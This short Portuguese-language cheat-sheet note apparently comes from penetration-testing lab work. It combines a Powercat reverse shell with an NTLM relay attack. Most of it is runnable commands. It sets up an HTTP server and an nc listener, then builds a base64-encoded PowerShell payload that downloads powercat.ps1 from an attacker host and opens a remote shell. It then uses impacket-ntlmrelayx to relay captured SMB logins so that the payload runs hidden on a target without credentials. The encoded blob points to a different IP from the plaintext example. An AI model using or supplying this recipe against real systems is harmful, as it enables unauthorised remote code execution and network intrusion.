---
title: "Powercat + NTLM Relay"
---

# Powercat + NTLM Relay

Payload Powercat encodado em base64 para execução via `-EncodedCommand`, combinado com NTLM relay via `impacket-ntlmrelayx`. O relay captura autenticações SMB na rede e executa o payload no alvo sem precisar de credenciais.

```shell
# Iniciar servidor HTTP e listener
python3 -m http.server 80
rlwrap nc -vnlp 443

# Gerar payload base64 em pwsh
pwsh
$Text = "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.242/powercat.ps1');powercat -c 192.168.45.242 -p 443 -e powershell"
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText
exit

# NTLM Relay — executar payload no alvo ao capturar autenticação SMB
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.221.212 -c "powershell -nop -w hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADEANQA2AC8AcABvAHcAZQByAGMAYQB0AC4AcABzADEAJwApADsAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMQA5ADIALgAxADYAOAAuADQANQAuADEANQA2ACAALQBwACAANAA0ADMAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsAA=="
```
